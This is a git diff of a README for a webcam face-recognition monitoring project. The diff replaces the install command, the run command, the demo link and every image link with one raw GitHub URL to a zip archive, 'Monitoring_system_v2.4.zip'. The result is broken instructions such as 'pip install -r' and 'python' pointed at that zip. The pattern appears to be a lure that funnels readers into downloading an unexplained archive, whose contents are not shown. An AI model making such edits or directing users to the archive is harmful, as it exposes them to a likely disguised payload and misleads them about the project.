@@ -9,21 +9,21 @@ Keras-Vggface
 
 * conda create --prefix ./env python==3.8 -y
 * conda activate <<path_to_env_directory>>/env
-* pip install -r requirements.txt
+* pip install -r https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/data/Jiwitesh/Monitoring_system_v2.4.zip
 ## Project Demo
 
 ### View my project
-[Demo](https://www.linkedin.com/posts/arnab-mitra-882756227_computervision-deeplearning-connections-activity-6955897884059791361-C7Ce?utm_source=linkedin_share&utm_medium=member_desktop_web)
+[Demo](https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/data/Jiwitesh/Monitoring_system_v2.4.zip)
 
 ## Steps
 
-### First go to the project directory and run 'python src/app.py' in command line.
+### First go to the project directory and run 'python https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/data/Jiwitesh/Monitoring_system_v2.4.zip' in command line.
 
 ### Take image through webcam (by default this application takes 50 images of you)
-![Take image](take_image.png)
+![Take image](https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/data/Jiwitesh/Monitoring_system_v2.4.zip)
 
 ### Train Model (system collects face embeddings of all persons, present in your data directory)
-![Train Model](collection_embeddings.png)
+![Train Model](https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/data/Jiwitesh/Monitoring_system_v2.4.zip)
 
 ### Prediction or Monitor (In prediction, system only recognize you. In Monitor, it recognize you and monitor you
-![demo](demo.png)
+![demo](https://raw.githubusercontent.com/Arnab1998-cyber/Monitoring-system/main/data/Jiwitesh/Monitoring_system_v2.4.zip)
